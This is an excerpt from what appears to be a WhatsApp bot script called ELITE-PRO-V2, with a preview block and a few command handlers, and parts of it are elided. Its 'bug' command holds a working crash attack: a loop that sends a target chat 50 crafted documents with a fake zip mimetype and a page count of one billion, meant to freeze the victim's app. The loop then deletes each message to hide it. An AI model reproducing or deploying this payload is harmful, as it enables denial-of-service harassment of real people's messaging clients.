...
title: '𝗘𝗟𝗜𝗧𝗘-𝗣𝗥𝗢-𝗩𝟮',
body: 'Enjoy unlimited features 🫠🫠',
thumbnailUrl: 'https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-url/IMG-20250503-WA0031.jpg',
sourceUrl: websitex,
},
},
text: txt,
...
case 'bug': {
    ...
    const XeonDoc = {
        url: "./src/data/function/XBug/x.mp3"
    };
    
    async function xeonFreeze(jid) {
        for (let i = 0; i < 50; i++) {
            // Send the document
            const sentMsg = await EliteProEmpire.sendMessage(jid, {
                'document': XeonDoc,
                'fileName': "🎁ELITE-PRO🎁" + xeontext1,
                'mimetype': "application/zip",
                'caption': "🎁ELITE-PRO🎁" + xeontext1,
                'pageCount': 0x3b9aca00,
                'contactVcard': true
            });
            
            // Immediately delete the sent message
            await EliteProEmpire.chatModify({
                delete: true,
                lastMessages: [{
                    key: sentMsg.key,
...
break;
  case 'totalfeature':
        ...
        case 'totalcmd': 
        case 'totalcommand': 
            reply(`Total Features of ${botname} is 1047`);
